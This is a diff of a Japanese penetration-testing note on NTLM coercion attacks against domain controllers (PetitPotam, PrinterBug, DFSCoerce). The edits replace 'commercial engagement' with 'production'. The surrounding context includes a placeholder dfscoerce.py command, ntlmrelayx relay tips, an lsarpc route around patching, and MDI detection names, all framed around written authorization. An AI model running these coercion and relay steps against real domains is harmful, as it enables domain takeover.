@@ -1,6 +1,6 @@
 # Coerce 系 — PetitPotam / PrinterBug / DFSCoerce（強制認証）
 
-> **[HIGH IMPACT]** 本攻撃は以下の理由で商用案件では原則禁止または個別合意必須：
+> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
 > - [x] 業務停止リスク（DC への DCE/RPC 呼び出しを直接行う。DC 不安定環境では一時的な影響が出る可能性がある）
 > - [ ] 持続化に該当
 > - [ ] 不可逆な設定変更を含む
@@ -181,7 +181,7 @@ python3 dfscoerce.py -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_I
 
 - **Coerce は起点。成果を生むのは ntlmrelayx 側の設定**：PetitPotam / PrinterBug / DFSCoerce 自体はハッシュも権限も取得しない。ntlmrelayx がどのプロトコルをどのターゲットへリレーするかが成否を決める
 - **`[ATTACKER_IP]` はテスター端末の到達可能 IP を指定**：`ip a` で対象セグメント向けのインターフェース IP を確認する。ntlmrelayx がリッスンしている IP と一致させること（環境によって物理 LAN・VPN・専用線など異なる）
-- **DC への RPC 呼び出しは MDI がほぼ確実に検知する**：PetitPotam は MDI「Suspected DCE/RPC Exploitation Attempt」として記録される。商用案件では検知前提で書面合意を取っておく
+- **DC への RPC 呼び出しは MDI がほぼ確実に検知する**：PetitPotam は MDI「Suspected DCE/RPC Exploitation Attempt」として記録される。本番では検知前提で書面合意を取っておく
 - **PetitPotam はパッチ後も `lsarpc` パイプ経由で動作する環境が残っている**：`efsrpc` が塞がれていても `lsarpc` で成功することがある。両方試してから諦める
 - **PrinterBug は Unconstrained Delegation 攻撃でも使われる**：DC が Unconstrained Delegation 対象の場合に DC$ の TGT をメモリに書き込ませる手法（`../Delegation_Attacks/Unconstrained.md`）。同じコマンドが両方のシナリオで登場する
 - **Coerce は設定変更を行わないため原状回復項目なし**：組み合わせた ntlmrelayx 側（Shadow Credentials / RBCD / マシンアカウント）の削除は `ntlmrelayx.md` を参照
@@ -199,7 +199,7 @@ python3 dfscoerce.py -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_I
 
 ---
 
-## 商用案件での前提
+## 本番での前提
 
 - **事前合意の要否**: ★★★（書面承認必須）。DC への直接 RPC 呼び出しを伴い、MDI で即アラートが上がる
 - **想定されるSIEM/EDR検知**: MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768・4624 / ネットワーク NDR（DC からのアウトバウンド認証コールバック）
